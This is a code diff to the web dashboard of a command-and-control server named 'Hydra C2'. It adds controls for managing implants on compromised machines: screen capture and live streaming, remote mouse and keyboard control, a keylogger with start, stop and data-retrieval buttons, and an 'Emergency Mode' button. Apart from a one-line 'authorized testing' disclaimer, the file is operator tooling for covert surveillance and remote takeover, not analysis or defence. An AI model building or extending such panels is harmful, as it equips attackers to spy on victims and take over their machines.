@@ -7,6 +7,7 @@
     <title>Hydra C2 Dashboard</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" rel="stylesheet">
     <link href="/static/css/dashboard.css" rel="stylesheet">
 </head>
 
@@ -111,37 +112,142 @@
                 <!-- Remote Control Section -->
                 <div id="remote-control" class="content-section d-none">
                     <h2>Remote Control</h2>
+                    <div id="selected-implant-header" class="alert alert-primary mb-3 d-none">
+                        No implant selected
+                    </div>
+                    
                     <div class="row">
                         <div class="col-md-8">
-                            <div class="card">
+                            <div class="card mb-3">
+                                <div class="card-header bg-primary text-white">
+                                    <h5 class="mb-0"><i class="fas fa-desktop"></i> Screen View</h5>
+                                </div>
                                 <div class="card-body">
                                     <div id="screen-view" class="screen-container">
-                                        <img id="screen-capture" src="" alt="Screen Capture" class="img-fluid">
+                                        <img id="screen-capture" src="" alt="Screen Capture" class="img-fluid d-none">
+                                        <div class="no-screenshot">No screenshot available. Click "Capture Screen" or "Start Stream" to begin.</div>
                                     </div>
                                     <div class="mt-3">
-                                        <button class="btn btn-primary" onclick="captureScreen()">
-                                            <i class="fas fa-camera"></i> Capture Screen
+                                        <div class="btn-group mb-2">
+                                            <button id="capture-screen" class="btn btn-primary">
+                                                <i class="fas fa-camera"></i> Capture Screen
+                                            </button>
+                                            <button id="start-stream" class="btn btn-success">
+                                                <i class="fas fa-play"></i> Start Stream
+                                            </button>
+                                            <button id="stop-stream" class="btn btn-danger" disabled>
+                                                <i class="fas fa-stop"></i> Stop Stream
+                                            </button>
+                                        </div>
+                                        <div class="btn-group mb-2">
+                                            <button id="enable-control" class="btn btn-warning" disabled>
+                                                <i class="fas fa-mouse-pointer"></i> Enable Control
+                                            </button>
+                                            <button id="disable-control" class="btn btn-secondary" disabled>
+                                                <i class="fas fa-ban"></i> Disable Control
+                                            </button>
+                                        </div>
+                                        <div class="alert alert-info mt-2 small">
+                                            <i class="fas fa-info-circle"></i> To control the remote system: Start Stream, then Enable Control. 
+                                            Mouse clicks and keyboard input will be sent to the remote system.
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <!-- Keylogger section -->
+                            <div class="card">
+                                <div class="card-header bg-warning text-dark">
+                                    <h5 class="mb-0"><i class="fas fa-keyboard"></i> Keylogger Controls</h5>
+                                </div>
+                                <div class="card-body">
+                                    <div class="btn-group mb-2">
+                                        <button id="start-keylogger" class="btn btn-warning">
+                                            <i class="fas fa-circle"></i> Start Keylogger
                                         </button>
-                                        <button class="btn btn-success" onclick="startScreenStream()">
-                                            <i class="fas fa-play"></i> Start Stream
+                                        <button id="stop-keylogger" class="btn btn-danger" disabled>
+                                            <i class="fas fa-stop-circle"></i> Stop Keylogger
                                         </button>
-                                        <button class="btn btn-danger" onclick="stopScreenStream()">
-                                            <i class="fas fa-stop"></i> Stop Stream
+                                        <button id="get-keylog-data" class="btn btn-info">
+                                            <i class="fas fa-download"></i> Retrieve Data
                                         </button>
+                                    </div>
+                                    <div class="alert alert-secondary mt-2 small">
+                                        <i class="fas fa-info-circle"></i> The keylogger captures user input on the remote system.
+                                        Use this feature responsibly and only for authorized testing.
                                     </div>
                                 </div>
                             </div>
                         </div>
+                        
                         <div class="col-md-4">
-                            <div class="card">
+                            <div class="card mb-3">
+                                <div class="card-header bg-info text-white">
+                                    <h5 class="mb-0"><i class="fas fa-info-circle"></i> System Information</h5>
+                                </div>
                                 <div class="card-body">
-                                    <h5>System Information</h5>
                                     <div id="system-info">
-                                        <p><strong>OS:</strong> <span id="os-info">-</span></p>
-                                        <p><strong>IP:</strong> <span id="ip-info">-</span></p>
-                                        <p><strong>Last Seen:</strong> <span id="last-seen">-</span></p>
-                                        <p><strong>CPU Usage:</strong> <span id="cpu-usage">-</span></p>
-                                        <p><strong>Memory Usage:</strong> <span id="memory-usage">-</span></p>
+                                        <div class="mb-2">
+                                            <span class="fw-bold">OS:</span>
+                                            <span id="os-info" class="ms-2">-</span>
+                                        </div>
+                                        <div class="mb-2">
+                                            <span class="fw-bold">IP:</span>
+                                            <span id="ip-info" class="ms-2">-</span>
+                                        </div>
+                                        <div class="mb-2">
+                                            <span class="fw-bold">Last Seen:</span>
+                                            <span id="last-seen" class="ms-2">-</span>
+                                        </div>
+                                        
+                                        <div class="mb-2">
+                                            <span class="fw-bold">CPU Usage:</span>
+                                            <div class="progress mt-1">
+                                                <div id="cpu-usage-bar" class="progress-bar" role="progressbar" style="width: 0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">0%</div>
+                                            </div>
+                                        </div>
+                                        
+                                        <div class="mb-2">
+                                            <span class="fw-bold">Memory Usage:</span>
+                                            <div class="progress mt-1">
+                                                <div id="memory-usage-bar" class="progress-bar bg-warning" role="progressbar" style="width: 0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">0%</div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <button id="refresh-system-info" class="btn btn-info mt-3 w-100">
+                                        <i class="fas fa-sync"></i> Refresh System Info
+                                    </button>
+                                    <button id="emergency-mode-btn" class="btn btn-warning mt-2 w-100">
+                                        <i class="fas fa-exclamation-triangle"></i> Enable Emergency Mode
+                                    </button>
+                                </div>
+                            </div>
+                            
+                            <!-- Connection Status -->
+                            <div class="card">
+                                <div class="card-header bg-success text-white">
+                                    <h5 class="mb-0"><i class="fas fa-signal"></i> Connection Status</h5>
+                                </div>
+                                <div class="card-body">
+                                    <div id="connection-status">
+                                        <div class="d-flex align-items-center mb-2">
+                                            <div class="connection-indicator me-2"></div>
+                                            <span>Connection: <span id="connection-text">Not Connected</span></span>
+                                        </div>
+                                        <div class="mb-2">
+                                            <span class="fw-bold">Latency:</span>
+                                            <span id="connection-latency" class="ms-2">-</span>
+                                        </div>
+                                        <div class="mb-2">
+                                            <span class="fw-bold">Connected Since:</span>
+                                            <span id="connection-time" class="ms-2">-</span>
+                                        </div>
+                                        <button id="reconnect-button" class="btn btn-sm btn-primary mt-2" onclick="WebSocketManager.reconnect()">
+                                            <i class="fas fa-sync"></i> Reconnect
+                                        </button>
+                                        <button id="check-server-button" class="btn btn-sm btn-secondary mt-2 ms-2" onclick="WebSocketManager.checkServerStatus()">
+                                            <i class="fas fa-server"></i> Check Server
+                                        </button>
                                     </div>
                                 </div>
                             </div>
@@ -350,6 +456,8 @@
 
     <!-- Scripts -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <script>
         // Add early token check
         const tokenCheck = () => {
@@ -367,6 +475,80 @@
             throw new Error('Authentication check failed');
         }
 
+        // Global function to view a specific implant
+        window.viewImplant = function(implantId) {
+            try {
+                console.log('View implant called with ID:', implantId);
+                
+                // Store the implant ID in WebSocketManager and localStorage for persistence
+                if (window.WebSocketManager) {
+                    WebSocketManager.setSelectedImplant(implantId);
+                } else {
+                    localStorage.setItem('selectedImplantId', implantId);
+                }
+                
+                // Hide implants section and show remote control section
+                document.querySelectorAll('.content-section').forEach(section => {
+                    section.classList.add('d-none');
+                });
+                
+                const remoteControlSection = document.getElementById('remote-control');
+                if (remoteControlSection) {
+                    remoteControlSection.classList.remove('d-none');
+                }
+                
+                // Update active state in sidebar
+                document.querySelectorAll('#sidebar li').forEach(item => {
+                    item.classList.remove('active');
+                });
+                
+                const remoteControlNav = document.querySelector('#sidebar a[href="#remote-control"]');
+                if (remoteControlNav) {
+                    remoteControlNav.parentElement.classList.add('active');
+                }
+                
+                // Check if RemoteControlModule exists and is ready
+                if (window.RemoteControlModule) {
+                    // Check if WebSocketManager is connected before requesting system info
+                    if (WebSocketManager && WebSocketManager.socket && 
+                        WebSocketManager.socket.readyState === WebSocket.OPEN) {
+                        // WebSocket is connected, update system info immediately
+                        if (RemoteControlModule.updateSystemInfo) {
+                            setTimeout(() => RemoteControlModule.updateSystemInfo(), 500);
+                        }
+                    } else {
+                        console.warn('WebSocket not connected, will update system info when connection is established');
+                        // Set a listener for when the WebSocket reconnects
+                        document.addEventListener('websocket-ready', () => {
+                            console.log('WebSocket reconnected, updating system info');
+                            if (RemoteControlModule && RemoteControlModule.updateSystemInfo) {
+                                setTimeout(() => RemoteControlModule.updateSystemInfo(), 1000);
+                            }
+                        }, { once: true });
+                    }
+                } else {
+                    console.warn('RemoteControlModule not available yet - it will be initialized when loaded');
+                    // For debugging
+                    if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
+                        dashboard.showNotification('Remote control module is still loading, please wait...', 'info');
+                    }
+                }
+            } catch (error) {
+                console.error('Error in viewImplant:', error);
+                const alertsContainer = document.getElementById('alerts-container');
+                if (alertsContainer) {
+                    const alertDiv = document.createElement('div');
+                    alertDiv.className = 'alert alert-danger alert-dismissible fade show';
+                    alertDiv.innerHTML = `
+                        Error selecting implant
+                        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+                    `;
+                    alertsContainer.appendChild(alertDiv);
+                    setTimeout(() => alertDiv.remove(), 5000);
+                }
+            }
+        };
+
         // Global function to update implants table - needed by WebSocketManager
         function updateImplantsTable(implants) {
             const tbody = document.querySelector('#implants-table tbody');
@@ -383,7 +565,6 @@
                     <td><span class="badge bg-${implant.status === 'online' ? 'success' : 'danger'}">${implant.status}</span></td>
                     <td>
                         <button class="btn btn-sm btn-primary" onclick="viewImplant('${implant.id}')">View</button>
-                        <button class="btn btn-sm btn-danger" onclick="deleteImplant('${implant.id}')">Delete</button>
                     </td>
                 `;
                 tbody.appendChild(tr);
@@ -471,13 +652,116 @@
             document.getElementById('sidebar').classList.toggle('active');
         });
     </script>
+    <!-- Load WebSocketManager first since other modules depend on it -->
     <script src="/static/js/websocket-manager.js"></script>
+    <!-- Load other modules -->
     <script src="/static/js/implants.js"></script>
     <script src="/static/js/remote-control.js"></script>
     <script src="/static/js/file-manager.js"></script>
     <script src="/static/js/process-manager.js"></script>
     <script src="/static/js/network.js"></script>
     <script src="/static/js/settings.js"></script>
+    <!-- Load dashboard.js last, since it references all other modules -->
+    <script src="/static/js/dashboard.js"></script>
+    <!-- Add this script block right after the closing WebSocketManager script tag -->
+    <script>
+        // Enhance navigation between views
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set up sidebar navigation with implant selection preservation
+            document.querySelectorAll('#sidebar a').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    
+                    const targetId = this.getAttribute('href').substring(1);
+                    
+                    // Hide all content sections
+                    document.querySelectorAll('.content-section').forEach(section => {
+                        section.classList.add('d-none');
+                    });
+                    
+                    // Show the target section
+                    const targetSection = document.getElementById(targetId);
+                    if (targetSection) {
+                        targetSection.classList.remove('d-none');
+                    }
+                    
+                    // Update active state in sidebar
+                    document.querySelectorAll('#sidebar li').forEach(item => {
+                        item.classList.remove('active');
+                    });
+                    this.parentElement.classList.add('active');
+                    
+                    // Special handling for remote control view
+                    if (targetId === 'remote-control') {
+                        console.log('Switched to remote control view');
+                        
+                        // Check if we have a selected implant in WebSocketManager
+                        if (WebSocketManager && WebSocketManager.selectedImplantId) {
+                            console.log(`Found selected implant: ${WebSocketManager.selectedImplantId}`);
+                            
+                            // Make sure RemoteControlModule is aware of the selection
+                            if (RemoteControlModule) {
+                                console.log('Notifying RemoteControlModule of selected implant');
+                                // Wait a bit for the DOM to update before updating the interface
+                                setTimeout(() => {
+                                    RemoteControlModule.selectImplant(WebSocketManager.selectedImplantId);
+                                    RemoteControlModule.updateRemoteControlInterface();
+                                }, 200);
+                            }
+                        } else {
+                            console.log('No implant selected when switching to remote control view');
+                            // Show a notification to select an implant first
+                            if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
+                                dashboard.showNotification('Please select an implant from the Implants list first', 'warning');
+                            }
+                        }
+                    }
+                });
+            });
+            
+            // Check if we should redirect to implants list when remote control has no selection
+            const checkRemoteControlRedirect = () => {
+                const remoteControlSection = document.getElementById('remote-control');
+                
+                // Only check if we're on the remote control page
+                if (remoteControlSection && !remoteControlSection.classList.contains('d-none')) {
+                    const hasSelection = WebSocketManager && WebSocketManager.selectedImplantId;
+                    
+                    if (!hasSelection) {
+                        console.log('No implant selected, redirecting to implants list');
+                        
+                        // Switch to implants view
+                        document.querySelectorAll('.content-section').forEach(section => {
+                            section.classList.add('d-none');
+                        });
+                        
+                        const implantsSection = document.getElementById('implants');
+                        if (implantsSection) {
+                            implantsSection.classList.remove('d-none');
+                        }
+                        
+                        // Update sidebar selection
+                        document.querySelectorAll('#sidebar li').forEach(item => {
+                            item.classList.remove('active');
+                        });
+                        
+                        const implantsNav = document.querySelector('#sidebar a[href="#implants"]');
+                        if (implantsNav) {
+                            implantsNav.parentElement.classList.add('active');
+                        }
+                        
+                        // Show notification
+                        if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
+                            dashboard.showNotification('Please select an implant first', 'warning');
+                        }
+                    }
+                }
+            };
+            
+            // Check for redirect after a short delay
+            setTimeout(checkRemoteControlRedirect, 500);
+        });
+    </script>
 </body>
 
 </html>
